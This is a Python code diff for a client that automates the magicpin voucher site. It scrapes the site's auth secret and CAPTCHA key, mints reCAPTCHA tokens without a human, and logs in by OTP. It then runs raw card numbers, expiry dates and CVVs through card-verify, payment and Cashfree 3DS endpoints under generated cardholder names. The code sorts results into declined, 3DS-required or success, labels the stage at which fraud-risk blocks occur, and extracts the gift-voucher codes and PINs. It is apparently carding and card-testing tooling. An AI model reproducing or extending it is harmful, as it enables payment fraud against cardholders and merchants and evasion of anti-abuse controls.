+    def _hdr(self, site="same-origin", mode="cors", dest="empty", extra=None):
+        h = _mpin_fp()
+        h.update({"sec-fetch-site": site, "sec-fetch-mode": mode, "sec-fetch-dest": dest})
+        if extra:
+            h.update(extra)
+        return h
+
+    def get(self, url, **kw):
+        kw.setdefault("timeout", 25)
+        return self.client.get(url, **kw)
+
+    def post(self, url, **kw):
+        kw.setdefault("timeout", 25)
+        return self.client.post(url, **kw)
+
+    def close(self):
+        try:
+            self.client.close()
+        except Exception:
+            pass
+        try:
+            if self.pg is not None:
+                self.pg.close()
+        except Exception:
+            pass
+
+    # ── persisted session ───────────────────────────────────────────
+    def load_dict(self, d: dict):
+        try:
+            self.phone = d.get("phone") or self.phone
+            self.user_id = d.get("user_id") or self.user_id
+            self.auth_token = d.get("auth_token") or self.auth_token
+            self.user_w_id = d.get("user_w_id") or self.user_w_id
+            self.user_name = d.get("user_name") or self.user_name
+            self.email = d.get("email") or self.email
+            self.city = d.get("city") or self.city
+            self.locality = d.get("locality") or self.locality
+            self.lat = str(d.get("lat") or self.lat)
+            self.lon = str(d.get("lon") or self.lon)
+            cfg = d.get("config") or {}
+            if cfg.get("key"):
+                self.auth_secret_key = cfg["key"]
+            if cfg.get("version"):
+                self.app_version = str(cfg["version"])
+            if cfg.get("captcha"):
+                self.captcha_site_key = cfg["captcha"]
+            self.config_ts = cfg.get("ts", 0) or 0
+            for k, v in (d.get("cookies") or {}).items():
+                try:
+                    self.client.cookies.set(str(k), str(v), domain=".magicpin.in")
+                except Exception:
+                    pass
+            self._seed_auth_cookies()
+        except Exception:
+            pass
+
+    def to_dict(self) -> dict:
+        self._seed_auth_cookies()
+        cookies = {}
+        try:
+            cookies = {str(k): str(v) for k, v in self.client.cookies.items()}
+        except Exception:
+            pass
+        return {
+            "phone": self.phone,
+            "user_id": self.user_id,
+            "auth_token": self.auth_token,
+            "user_w_id": self.user_w_id,
+            "user_name": self.user_name,
+            "email": self.email,
+            "city": self.city,
+            "locality": self.locality,
+            "lat": self.lat,
+            "lon": self.lon,
+            "config": {"key": self.auth_secret_key, "version": self.app_version,
+                       "captcha": self.captcha_site_key, "ts": self.config_ts},
+            "cookies": cookies,
+        }
+
+    def _seed_auth_cookies(self):
+        if not self.auth_token or not self.user_id:
+            return
+        seed = {
+            "user_id": str(self.user_id),
+            "auth_token": urllib.parse.quote(str(self.auth_token), safe="._-"),
+            "user_w_id": self.user_w_id or base64.b64encode(str(self.phone or "").encode()).decode(),
+            "is_new_user": "false",
+            "locality": "Chandni%20Chowk",
+            "city": "New%20Delhi",
+            "lat": self.lat,
+            "lon": self.lon,
+        }
+        for k, v in seed.items():
+            try:
+                if dict(self.client.cookies.items()).get(k) != v:
+                    self.client.cookies.set(k, str(v), domain=".magicpin.in")
+            except Exception:
+                pass
+
+    def authed(self) -> bool:
+        return bool(self.auth_token and self.user_id and self.phone)
+
+    # ── config scrape ───────────────────────────────────────────────
+    def scrape_config(self):
+        try:
+            home = self.get(MPIN_HOST + "/", timeout=12).text or ""
+            js = re.findall(r'src=["\'](https://static\.magicpin\.com/samara/static/js/[^"\']+\.js(?:\.gz)?[^"\']*)["\']', home)
+            js = ["https://static.magicpin.com/samara/static/js/base/main.js"] + [u for u in js if u][:5]
+            key, ver, cap = self.auth_secret_key, self.app_version, self.captcha_site_key
+            for body in js[:6]:
+                try:
+                    b = self.get(body, timeout=15).text or ""
+                except Exception:
+                    continue
+                if key == MPIN_AUTH_SECRET:
+                    m = (re.search(r'set\(\s*["\']auth-secret-key["\']\s*,\s*["\']([A-Za-z0-9_-]{8,64})["\']', b)
+                         or re.search(r'["\']auth-secret-key["\']\s*:\s*["\']([A-Za-z0-9_-]{8,64})["\']', b))
+                    if m:
+                        key = m.group(1)
+                if ver == MPIN_APP_VERSION:
+                    m = re.search(r'(?<![A-Z_])APP_VERSION\s*=\s*(\d+)', b)
+                    if m:
+                        ver = m.group(1)
+                if cap == MPIN_CAPTCHA_KEY:
+                    m = re.search(r'GOOGLE_CAPTCHA_KEY\s*=\s*["\'](6L[a-zA-Z0-9_-]{20,})["\']', b)
+                    if m:
+                        cap = m.group(1)
+            self.auth_secret_key, self.app_version, self.captcha_site_key = key, ver, cap
+            self.config_ts = time.time()
+        except Exception as e:
+            print(f"⚠️ [MPIN] config scrape failed: {e}")
+
+    def ensure_config(self):
+        if self.config_ts and time.time() - self.config_ts < MPIN_CONFIG_TTL:
+            return
+        self.scrape_config()
+
+    # ── reCAPTCHA ───────────────────────────────────────────────────
+    def mint_recaptcha(self, action="submit") -> str:
+        site = self.captcha_site_key
+        co = "aHR0cHM6Ly9tYWdpY3Bpbi5pbjo0NDM"
+        anchor = (f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={site}&co={co}"
+                  f"&hl=en&v=hzHrW5L7r5gS42REH6CmVH6Y&size=invisible&cb={random.random()}")
+        try:
+            r = self.get(anchor, headers=self._hdr("none", "navigate", "document",
+                                                  {"accept": "text/html,application/xhtml+xml"}))
+            m = re.search(r'id="recaptcha-token" value="([^"]+)"', r.text or "")
+            if not m:
+                return ""
+            form = (f"v=hzHrW5L7r5gS42REH6CmVH6Y&reason=q&c={m.group(1)}&k={site}"
+                    f"&co={co}&hl=en&size=invisible&sa={action}")
+            r2 = self.post("https://www.google.com/recaptcha/api2/reload", content=form,
+                           headers={"content-type": "application/x-www-form-urlencoded", "referer": anchor})
+            m2 = re.search(r'"rresp","([^"]+)"', r2.text or "")
+            return m2.group(1) if m2 else ""
+        except Exception:
+            return ""
+
+    # ── OTP ─────────────────────────────────────────────────────────
+    def send_otp(self, phone: str, token: str = "") -> dict:
+        clean = _mpin_norm_phone(phone)
+        if len(clean) == 10:
+            clean = "91" + clean
+        self.phone = clean
+        self.ensure_config()
+        headers = self._hdr("same-site", "cors", "empty", {
+            "accept": "*/*",
+            "auth-secret-key": self.auth_secret_key,
+            "content-type": "application/json",
+            "origin": MPIN_HOST,
+            "referer": MPIN_HOST + "/",
+        })
+        payload = {"phoneNumber": clean, "email": "", "authMethod": "SMS"}
+        if not token:
+            token = self.mint_recaptcha()
+        if token:
+            payload["token"] = token
+        try:
+            r = self.post(MPIN_API + "/ultron-web/sentAuthOtp_v2/", json=payload, headers=headers)
+            return r.json()
+        except Exception as e:
+            return {"status": "ERROR", "message": str(e)}
+
+    def verify_otp(self, phone: str, otp: str) -> dict:
+        clean = _mpin_norm_phone(phone)
+        if len(clean) == 10:
+            clean = "91" + clean
+        self.phone = clean
+        headers = self._hdr("same-site", "cors", "empty", {
+            "accept": "*/*",
+            "content-type": "application/json",
+            "origin": MPIN_HOST,
+            "referer": MPIN_HOST + "/",
+        })
+        payload = {
+            "phone": clean,
+            "otp": re.sub(r"\D", "", str(otp)),
+            "lat": self.lat,
+            "lon": self.lon,
+            "source_of_origin": "customer_web",
+            "authMethod": "",
+            "queryParams": ("?utm_medium=stores&utm_source=search&utm_content=search_v6"
+                            "&utm_campaign=%24search&enableYSF=false"),
+        }
+        try:
+            data = self.post(MPIN_API + "/ultron-web/login/", json=payload, headers=headers).json()
+        except Exception as e:
+            return {"status": "ERROR", "message": str(e)}
+        api = data.get("apiResponse") if isinstance(data.get("apiResponse"), dict) else {}
+        uid = data.get("user_id") or api.get("user_id")
+        tok = data.get("auth_token") or data.get("access_token") or api.get("auth_token") or api.get("access_token")
+        if not uid or not tok:
+            try:
+                jar = dict(self.client.cookies.items())
+                uid = uid or jar.get("user_id")
+                tok = tok or jar.get("auth_token") or jar.get("access_token")
+            except Exception:
+                pass
+        if uid and tok:
+            self.user_id = str(uid)
+            self.auth_token = str(tok)
+            self.user_w_id = base64.b64encode(clean.encode("utf-8")).decode("utf-8")
+            self.user_name = data.get("first_name") or api.get("name") or self.user_name
+            self._seed_auth_cookies()
+        return data
+
+    # ── vouchers ────────────────────────────────────────────────────
+    def fetch_variants(self, url: str, default_mid=None) -> dict:
+        r = self.get(url)
+        if r.status_code != 200:
+            raise ValueError(f"page http {r.status_code}")
+        html_t = r.text or ""
+        mid = default_mid
+        name = ""
+        vouchers = []
+        m = re.search(r"['\"]muid['\"]\s*:\s*['\"]?(\d+)['\"]?", html_t)
+        if m:
+            mid = int(m.group(1))
+        for block in re.findall(r'<script\s+type=[\'"]application/ld\+json[\'"]>(.*?)</script>', html_t, re.DOTALL):
+            try:
+                d = json.loads(block.strip())
+                if isinstance(d, list):
+                    d = d[0] if d else {}
+                if d.get("@type") != "Product":
+                    continue
+                name = d.get("name", "") or name
+                for off in d.get("offers", {}).get("offers", []):
+                    p_url = off.get("url", "")
+                    roa = urllib.parse.parse_qs(urllib.parse.urlparse(p_url).query).get("selected_voucher_roa_id", [None])[0]
+                    price = off.get("price")
+                    if roa and price is not None:
+                        vouchers.append({"roa_id": int(roa), "amount": float(price),
+                                         "name": off.get("name", ""),
+                                         "in_stock": "InStock" in str(off.get("availability", ""))})
+            except Exception:
+                pass
+        return {"merchant_id": mid, "merchant_name": name or "Brand Voucher", "vouchers": vouchers}
+
+    def payment_division(self, merchant_id, roa_id, amount, count=1) -> dict:
+        headers = self._hdr("same-origin", "cors", "empty", {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": MPIN_HOST,
+            "referer": MPIN_HOST + "/vouchers/",
+        })
+        total = float(amount) * int(count)
+        payload = {
+            "phone": self.phone,
+            "amount": total,
+            "userCoupon": None,
+            "vouchers": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id),
+                          "amount": float(amount), "count": int(count), "merchantUserId": int(merchant_id)}],
+            "magicProSubscriptionId": "",
+            "removeMagicProAutoAdd": False,
+            "email": self.email,
+        }
+        r = self.post(MPIN_HOST + "/sam-api/vouchers/getPaymentDivision/", json=payload, headers=headers)
+        if r.status_code != 200:
+            raise ValueError(f"cart http {r.status_code}")
+        j = r.json()
+        res = j.get("data", j) if isinstance(j, dict) else {}
+        return {
+            "total_face_value": total,
+            "payable_amount": float(res.get("payable_amount") or res.get("pg_amount") or total),
+            "points_used": res.get("magicpin_amount", 0),
+        }
+
+    def claim_free(self, merchant_id, roa_id, amount, count=1) -> dict:
+        headers = self._hdr("same-origin", "cors", "empty", {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": MPIN_HOST,
+            "referer": MPIN_HOST + "/vouchers/",
+        })
+        payload = {
+            "amount": float(amount) * int(count),
+            "vouchers": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id),
+                          "amount": float(amount), "count": int(count), "merchantUserId": int(merchant_id)}],
+            "phone": self.phone,
+            "email": self.email,
+            "userCoupon": None,
+        }
+        r = self.post(MPIN_HOST + "/sam-api/vouchers/payMp/", json=payload, headers=headers)
+        try:
+            return r.json()
+        except Exception:
+            return {"status": "RESP", "text": r.text, "status_code": r.status_code}
+
+    def initiate_gateway(self, merchant_id, roa_id, amount, count, payable,
+                         retries=2, cooldown=60):
+        """Create the payment session; on magicpin's attempt-limit cool down
+        and retry once (ported from the wiz reference), else return None."""
+        for attempt in range(max(1, retries)):
+            txn = self._initiate_gateway_once(merchant_id, roa_id, amount,
+                                              count, payable)
+            if txn:
+                return txn
+            if self.last_pg_code == "PG_ATTEMPT_LIMIT" and attempt < retries - 1:
+                print(f"⚠️ [MPIN] gateway attempt-limit — cooling {cooldown}s "
+                      f"({attempt + 1}/{retries})")
+                time.sleep(cooldown)
+                continue
+            break
+        return None
+
+    def _initiate_gateway_once(self, merchant_id, roa_id, amount, count, payable):
+        self.last_pg_code = None
+        self.last_pg_message = ""
+        headers = self._hdr("same-origin", "navigate", "document", {
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": MPIN_HOST,
+            "referer": MPIN_HOST + "/vouchers/",
+            "upgrade-insecure-requests": "1",
+        })
+        payment = {
+            "firstName": self.user_name,
+            "phone": self.phone,
+            "email": self.email,
+            "amount": payable,
+            "accessToken": self.auth_token,
+            "userId": self.user_id,
+            "type": "wallet",
+            "sourceOfCall": "web",
+            "couponData": {
+                "multipleRedemptions": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id),
+                                         "amount": float(amount), "count": int(count),
+                                         "merchantUserId": int(merchant_id)}],
+                "merchant_id": int(merchant_id),
+                "phone_no": self.phone,
+                "recharge_to": self.phone,
+                "mp-authorization": self.auth_token,
+                "app-version": str(self.app_version),
+                "totalItems": int(count),
+                "operator": "",
+                "pay_value": payable,
+                "type": "redemption",
+                "country": "IN",
+                "userCoupon": None,
+                "firstName": self.user_name,
+                "email": self.email,
+                "sourceOfCall": "web",
+            },
+            "callback_url": MPIN_HOST + "/payment/result/",
+            "userType": "CUSTOMER_WEB",
+            "paymentMotive": "VOUCHER_PURCHASE",
+        }
+        r = self.post(MPIN_HOST + "/samapi/users/payment/", data={"data": json.dumps(payment)},
+                      headers=headers, follow_redirects=False)
+        loc = r.headers.get("Location") or ""
+        body = r.text or ""
+        txn = None
+        m = re.search(r"/page/([a-zA-Z0-9_-]+)/startpayment", loc) or re.search(r"/page/([a-zA-Z0-9_-]+)/startpayment", body)
+        if m:
+            txn = m.group(1)
+        if not txn:
+            m = re.search(r"['\"](?:txnId|transactionId|paymentSessionId)['\"]\s*:\s*['\"]([a-zA-Z0-9_-]+)['\"]", body)
+            if m:
+                txn = m.group(1)
+        if not txn:
+            try:
+                j = r.json()
+                dd = j.get("data") or j
+                txn = dd.get("txnId") or dd.get("transactionId")
+            except Exception:
+                pass
+        if txn:
+            self.last_pg_code = "OK"
+            return txn
+
+        msg = ""
+        m = re.search(r"message=([^&]+)", loc) or re.search(r'"message"\s*:\s*"([^"]+)"', body)
+        if m:
+            msg = urllib.parse.unquote(m.group(1)) or m.group(1)
+        up = body.upper()
+        failed = bool(re.search(r"status=(FAILURE|FAILED|ERROR)", loc, re.I)) or "FAILURE" in up or "FAILED" in up
+        limited = any(x in msg.lower() for x in ("failed payment attempts", "try again after some time", "exceeded"))
+        if failed and limited:
+            self.last_pg_code = "PG_ATTEMPT_LIMIT"
+            self.last_pg_message = msg or loc
+        elif failed:
+            self.last_pg_code = "PG_FAILURE"
+            self.last_pg_message = msg or loc
+        else:
+            self.last_pg_code = "UNPARSED"
+            self.last_pg_message = f"http {r.status_code} {(loc[:100] or body[:100])}"
+        return None
+
+    def pg_options(self, txn_id: str) -> dict:
+        headers = self._hdr("same-origin", "cors", "empty", {
+            "accept": "application/json, text/plain, */*",
+            "origin": MPIN_PG,
+            "referer": f"{MPIN_PG}/page/{txn_id}/startpayment",
+        })
+        return self.pg_get(f"{MPIN_PG}/pg/payment/getPaymentOptions/{txn_id}?merchantWalletSelected=true",
+                           headers=headers).json()
+
+    def verify_card(self, txn_id: str, card_no: str) -> dict:
+        headers = self._hdr("same-origin", "cors", "empty", {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": MPIN_PG,
+            "referer": f"{MPIN_PG}/page/{txn_id}/startpayment/addnewcard",
+        })
+        r = self.pg_post(f"{MPIN_PG}/cards/verify/cardNumber",
+                         json={"cardNo": card_no, "txnId": txn_id, "userId": str(self.user_id)},
+                         headers=headers)
+        try:
+            return r.json()
+        except Exception:
+            return {"status": "RESP", "text": r.text}
+
+    def make_payment(self, txn_id, card_no, exp_mon, exp_yr, cvv, amount, card_name=None) -> dict:
+        headers = self._hdr("same-origin", "cors", "empty", {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": MPIN_PG,
+            "referer": f"{MPIN_PG}/page/{txn_id}/startpayment/addnewcard",
+        })
+        payload = {
+            "txnId": txn_id,
+            "userType": "CUSTOMER_WEB",
+            "firstName": None,
+            "emailId": self.email,
+            "amount": float(amount),
+            "phoneNo": self.phone,
+            "userId": str(self.user_id),
+            "storeCard": "0",
+            "paymentMode": "card",
+            "cardNo": card_no,
+            "cardName": card_name or _mpin_name(),
+            "cvv": cvv,
+            "cardExpMon": exp_mon,
+            "cardExpYear": exp_yr,
+            "pgCouponCode": False,
+            "instrumentId": card_no,
+            "paymentInstrument": "card",
+            "isMandateActivationFlow": False,
+            "appVersion": int(self.app_version) if str(self.app_version).isdigit() else 5001,
+            "shouldOpenDirectOtp": True,
+            "magicCashSelected": False,
+            "magicCashAmount": 0,
+        }
+        r = self.pg_post(f"{MPIN_PG}/cards/payment/makePayment", json=payload, headers=headers)
+        try:
+            return r.json()
+        except Exception:
+            return {"status": "ERROR", "text": r.text, "status_code": r.status_code}
+
+    # ── cashfree / 3DS ──────────────────────────────────────────────
+    def cashfree_eval(self, payment_url: str, currency="EUR") -> dict:
+        try:
+            r = self.get(payment_url, timeout=12)
+            text = r.text or ""
+            m = re.search(r"<a[^>]*href=['\"]([^'\"]+)['\"][^>]*id=['\"]redirectLink['\"]", text)
+            if m:
+                r = self.get(m.group(1), timeout=12)
+                text = r.text or ""
+            m_err = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', text)
+            if m_err or r.status_code >= 400 or "Broken Link!" in text:
+                msg = m_err.group(1).strip() if m_err else f"cashfree rejected (http {r.status_code})"
+                return {"status": "DECLINED", "reason": msg, "html_text": text}
+            sess = None
+            for src in (str(r.url), payment_url, text):
+                mm = re.search(r'[?&]pt=(session_[A-Za-z0-9_-]+)', src) or re.search(r'(session_[A-Za-z0-9_-]+paymentpayment)', src)
+                if mm:
+                    sess = mm.group(1)
+                    break
+            if sess:
+                headers = self._hdr("same-origin", "cors", "empty", {
+                    "accept": "application/json, text/plain, */*",
+                    "content-type": "application/json",
+                    "origin": "https://api.cashfree.com",
+                    "referer": f"https://api.cashfree.com/checkout/international?pt={sess}",
+                    "x-api-version": "2025-01-01",
+                })
+                body = {"currency": currency, "external_screening_token": "",
+                        "user_agent": _mpin_fp()["user-agent"]}
+                pay_url = f"https://api.cashfree.com/checkout/api/international/pay/{sess}"
+                rp, last_err = None, None
+                for ver in ("2026-01-01", "2025-01-01", "2023-08-01", "2022-09-01"):
+                    headers["x-api-version"] = ver
+                    cand = self.post(pay_url, json=body, headers=headers, timeout=15)
+                    if cand.status_code == 200:
+                        rp = cand
+                        break
+                    last_err = cand
+                    try:
+                        ec = (cand.json() or {}).get("code")
+                    except Exception:
+                        ec = None
+                    if ec not in ("version_missing", "version_invalid", "request_failed"):
+                        break
+                rp = rp or last_err
+                if rp is not None and rp.status_code == 200:
+                    d = rp.json()
+                    url = (d.get("data") or {}).get("url")
+                    if url:
+                        chk = self.get(url, timeout=10)
+                        e = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', chk.text or "")
+                        if e or chk.status_code >= 400 or "Broken Link!" in (chk.text or ""):
+                            return {"status": "DECLINED",
+                                    "reason": e.group(1).strip() if e else f"challenge rejected (http {chk.status_code})",
+                                    "html_text": chk.text}
+                        return {"status": "3DS_REQUIRED", "challenge_url": url, "html_text": chk.text}
+                    if d.get("message"):
+                        return {"status": "DECLINED", "reason": d["message"]}
+                try:
+                    err = rp.json() if rp is not None else {}
+                except Exception:
+                    err = {}
+                return {"status": "DECLINED",
+                        "reason": err.get("message") or err.get("code") or f"cashfree http {getattr(rp, 'status_code', 0)}"}
+            return {"status": "3DS_REQUIRED", "challenge_url": str(r.url), "html_text": text}
+        except Exception as e:
+            return {"status": "DECLINED", "reason": str(e)[:120]}
+
+    @staticmethod
+    def order_token_from(url: str):
+        if not url:
+            return None
+        for pat in (r"/gateway/([A-Za-z0-9_-]{16,})", r"paynext3ds/([A-Za-z0-9_-]{16,})",
+                    r"[?&]order_token=([A-Za-z0-9_-]+)", r"pt=(session_[A-Za-z0-9_-]+)"):
+            m = re.search(pat, url)
+            if m:
+                return m.group(1)
+        return None
+
+    def _decline_reason(self, cb) -> str:
+        try:
+            url = cb.headers.get("Location") or ""
+            txt = ""
+            for _ in range(4):
+                if not url:
+                    break
+                r2 = self.get(url, timeout=12)
+                if r2.status_code == 302:
+                    url = r2.headers.get("Location") or ""
+                    if url and ("payment/result" in url or url.startswith("magicpin.in")):
+                        break
+                    continue
+                txt = r2.text or ""
+                break
+            for pat in (r'id=[\'"]error-text[\'"]>([^<]+)<',
+                        r'(?:declined|not (?:authorised|authorized)|insufficient|fraud|risk|invalid card|expired|failed)[^<.]{0,60}'):
+                m = re.search(pat, txt, re.I)
+                if m:
+                    s = (m.group(1) if m.lastindex else m.group(0)).strip()
+                    if len(s) >= 4:
+                        return s[:160]
+        except Exception:
+            pass
+        return ""
+
+    def resolve_3ds(self, txn_id, challenge_url=None, retries=8, delay=0.8) -> dict:
+        order_token = self.order_token_from(challenge_url or "")
+        if challenge_url:
+            try:
+                self.get(challenge_url, timeout=10)
+            except Exception:
+                pass
+        failure = None
+        for attempt in range(max(1, retries)):
+            if order_token:
+                try:
+                    cb = self.get(f"{MPIN_PG}/cards/payment/cashfreeCallback?order_id={txn_id}&order_token={order_token}",
+                                  follow_redirects=False, timeout=15)
+                    loc = cb.headers.get("Location") or ""
+                    if "payment_status=success" in loc:
+                        return {"status": "SUCCESS", "message": "settled", "order_token": order_token}
+                    if "payment_status=failure" in loc:
+                        reason = self._decline_reason(cb)
+                        if not reason:
+                            qs = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query)
+                            for k in ("reason", "failure_reason", "decline_reason", "gateway_message",
+                                      "error_message", "error", "message", "status_description"):
+                                vals = qs.get(k)
+                                if vals and vals[0] and vals[0].strip():
+                                    reason = vals[0].strip()
+                                    break
+                        if str(reason).strip().lower() in ("failure", "failed", "error", "declined", "false", "0", "null", "none"):
+                            reason = ""
+                        failure = {"status": "FAILURE",
+                                   "message": f"payment failed: {reason}" if reason else "payment failed (gateway declined card)",
+                                   "reason": reason, "order_token": order_token}
+                        if attempt >= 1:
+                            return failure
+                except Exception as e:
+                    failure = failure or {"status": "PENDING", "message": f"callback error: {e}"}
+            try:
+                st = self.pg_get(f"{MPIN_PG}/pg/payment/refreshPaymentStatus/{txn_id}",
+                                 headers={"accept": "application/json, text/plain, */*"}).json()
+                pst = str(st.get("paymentStatus") or "").upper()
+                op = st.get("orderPlaced")
+                if pst in ("SUCCESS", "PAID", "COMPLETED") or op is True:
+                    return {"status": "SUCCESS", "message": "paymentStatus=success"}
+                if pst in ("FAILURE", "FAILED", "DECLINED") or op is False:
+                    rsn = str(st.get("message") or "").strip()
+                    if rsn.lower() in ("", "failure", "failed", "error", "declined", "false", "null", "none"):
+                        rsn = ""
+                    return {"status": "FAILURE", "message": rsn or "payment failed (gateway declined card)", "reason": rsn}
+            except Exception:
+                pass
+            try:
+                valid = self._new_rows(self._voucher_rows(self.purchased()))
+                if valid:
+                    return {"status": "SUCCESS", "message": "voucher delivered",
+                            "vouchers": [self._entry_from_row(it, txn_id) for it in valid]}
+            except Exception:
+                pass
+            if failure and attempt >= 2:
+                return failure
+            time.sleep(delay)
+        if failure:
+            return failure
+        return {"status": "PENDING", "message": "settlement pending", "order_token": order_token}
+
+    # ── transactions / voucher codes ────────────────────────────────
+    def _voucher_rows(self, items):
+        out = []
+        for it in items or []:
+            if not isinstance(it, dict):
+                continue
+            t = str(it.get("type") or "").lower()
+            if t.startswith("dynamic") or t in ("ad", "ads", "floating_banner", "carousel", "banner"):
+                continue
+            if it.get("is_ad") is True or str(it.get("is_ad")).lower() == "true":
+                continue
+            out.append(it)
+        return out
+
+    def capture_txn_baseline(self) -> dict:
+        base = {}
+        for it in self._voucher_rows(self.purchased()):
+            tid = it.get("transaction_id") or it.get("transactionId") or it.get("id")
+            if tid:
+                base[str(tid)] = it.get("CreatedAt")
+        self._txn_baseline = base
+        return base
+
+    def _new_rows(self, rows):
+        if not self._txn_baseline:
+            return rows
+        return [it for it in (rows or [])
+                if str(it.get("transaction_id") or it.get("transactionId") or it.get("id") or "") not in self._txn_baseline]
+
+    def purchased(self):
+        headers = {"accept": "application/json, text/plain, */*",
+                   "referer": MPIN_HOST + "/user/transactions/"}
+        for u in (MPIN_HOST + "/sam-api/user/transactions/?filter=voucher",
+                  MPIN_HOST + "/sam-api/user/transactions/"):
+            try:
+                r = self.get(u, headers=headers)
+                if r.status_code == 200:
+                    j = r.json()
+                    items = j.get("data") or j.get("transactions") or []
+                    if items:
+                        return items
+            except Exception:
+                pass
+        return []
+
+    @staticmethod
+    def _card_text(v):
+        if isinstance(v, dict):
+            v = v.get("value") if "value" in v else (list(v.values())[0] if len(v) == 1 else "")
+        return str(v or "").strip()
+
+    def _entry_from_row(self, it, txn_id=None):
+        amap = (it.get("analytics") or {}).get("analytics_map") or {}
+        title = (self._card_text(it.get("title")) or self._card_text(it.get("item_title"))
+                 or self._card_text(amap.get("item_title")) or self._card_text(amap.get("subject_name")) or "voucher")
+        amount = (self._card_text(it.get("sub_title")) or self._card_text(it.get("amount"))
+                  or self._card_text(it.get("worthPrice")) or self._card_text(it.get("value")) or "")
+        amount = re.sub(r"#arrow#.*$", "", amount).strip()
+        return {
+            "brand": title,
+            "amount": amount,
+            "voucher_code": (it.get("voucher_code") or it.get("code") or it.get("voucherCode")
+                             or it.get("couponCode") or it.get("giftCode") or it.get("gift_code")
+                             or it.get("promo_code") or it.get("redemption_code") or ""),
+            "voucher_pin": (it.get("voucher_pin") or it.get("pin") or it.get("voucherPin")
+                            or it.get("secret") or it.get("pinCode") or ""),
+            "expiry": str(it.get("valid_till") or it.get("expiry") or it.get("expiry_date") or ""),
+            "order_id": str(it.get("transaction_id") or it.get("order_id") or txn_id or ""),
+        }
+
+    def collect_vouchers(self, txn_id=None, retries=6, delay=1.0, order_token=None):
+        for _ in range(max(1, retries)):
+            try:
+                valid = self._new_rows(self._voucher_rows(self.purchased()))
+            except Exception:
+                valid = []
+            if valid:
+                out = []
+                for it in valid:
+                    entry = self._entry_from_row(it, txn_id)
+                    self._enrich(it, entry, txn_id, order_token)
+                    out.append(entry)
+                return out
+            time.sleep(delay)
+        return []
+
+    def _enrich(self, it, entry, txn_id, order_token=None):
+        did = it.get("transaction_id") or it.get("transactionId") or it.get("id") or txn_id
+        if did:
+            try:
+                info = self.voucher_detail_page(did)
+                if info.get("voucher_code"):
+                    entry["voucher_code"] = info["voucher_code"]
+                if info.get("voucher_pin"):
+                    entry["voucher_pin"] = info["voucher_pin"]
+                if info.get("expiry"):
+                    entry["expiry"] = info["expiry"]
+            except Exception:
+                pass
+        if entry.get("voucher_code"):
+            return
+        mid = (it.get("analytics") or {}).get("analytics_map", {}).get("merchant_id") or it.get("merchant_id")
+        rid = it.get("id") or it.get("voucher_id") or it.get("redemption_id") or it.get("transaction_id") or txn_id
+        tid = it.get("transaction_id") or it.get("transactionId") or txn_id
+        token = order_token or it.get("token")
+        if not (mid and rid and token):
+            return
+        try:
+            resp = self.redeem_voucher(rid, tid, mid, token)
+            d = resp.get("data") if isinstance(resp, dict) and isinstance(resp.get("data"), dict) else (resp if isinstance(resp, dict) else {})
+            code = d.get("voucher_code") or d.get("code") or d.get("couponCode") or d.get("giftCode") or ""
+            pin = d.get("voucher_pin") or d.get("pin") or d.get("secret") or ""
+            if code:
+                entry["voucher_code"] = code
+            if pin:
+                entry["voucher_pin"] = pin
+        except Exception:
+            pass
+
+    def redeem_voucher(self, voucher_id, transaction_id, merchant_id, token) -> dict:
+        hd = {"accept": "application/json, text/plain, */*",
+              "referer": MPIN_HOST + "/user/transactions/",
+              "content-type": "application/json"}
+        try:
+            r = self.post(MPIN_HOST + "/sam-api/vouchers/redeem/",
+                          json={"data": {"transaction_id": str(transaction_id),
+                                         "merchant_id": int(merchant_id),
+                                         "id": str(voucher_id), "token": str(token)}},
+                          headers=hd, timeout=20)
+            if r.status_code == 200 and r.text:
+                return r.json()
+        except Exception:
+            pass
+        return {}
+
+    def voucher_detail_page(self, txn_id) -> dict:
+        try:
+            html_t = self.get(f"{MPIN_HOST}/voucherdetails?transaction_id={txn_id}", timeout=20).text or ""
+            m = re.search(r"window\.pageProps\s*=\s*JSON\.parse\(`(.*?)`\)", html_t, re.DOTALL)
+            if not m:
+                return {}
+            d = json.loads(m.group(1).encode().decode("unicode_escape", errors="replace"))
+            pd = d.get("payment_details") or {}
+            code = (pd.get("primary_voucher_code_info") or {}).get("value") or pd.get("code") or ""
+            pin = (pd.get("secondary_voucher_code_info") or {}).get("value") or pd.get("pin") or ""
+            exp = pd.get("valid_till") or pd.get("validity") or pd.get("expiry") or ""
+            return {"voucher_code": code or "", "voucher_pin": pin or "", "expiry": str(exp or "")}
+        except Exception:
+            return {}
+
+    # ── Phase 3: buy voucher + pay with card ────────────────────────
+    def buy(self, brand_key: str, card) -> dict:
+        """Wrapper: run the purchase and tag where a risk block happened."""
+        out = self._buy(brand_key, card)
+        try:
+            if self.last_verify_card:
+                out["raw_verify"] = self.last_verify_card
+            if self.last_pay_raw:
+                out["raw_pay"] = self.last_pay_raw
+        except Exception:
+            pass
+        stage = out.get("stage") or "session"
+        out["stage"] = stage
+        resp = str(out.get("response") or "")
+        if _mpin_is_risk(out) and not resp.startswith("["):
+            where = {"session": "pre-card IP/account", "card": "card step", "3ds": "3ds step"}.get(stage, stage)
+            out["response"] = f"[{where}] {resp}"
+        return out
+
+    def _buy(self, brand_key: str, card) -> dict:
+        brand = MPIN_BRANDS.get(brand_key) or MPIN_BRANDS[MPIN_DEFAULT_BRAND]
+        price = f"₹{float(brand['amount']):.2f}"
+        out = {"status": "ERROR", "response": "", "price": price, "brand": brand["label"],
+               "stage": "session"}
+        parts = _ext_card_parts(card)
+        if not parts:
+            out["response"] = "Bad card format"
+            return out
+        cc, mm, yy, cvv = parts
+        yr4 = "20" + yy if len(yy) == 2 else yy
+
+        if not self.authed():
+            out["response"] = "Session expired — run /mpin login <phone>"
+            return out
+
+        try:
+            cat = self.fetch_variants(brand["url"], brand.get("merchant_id"))
+        except Exception as e:
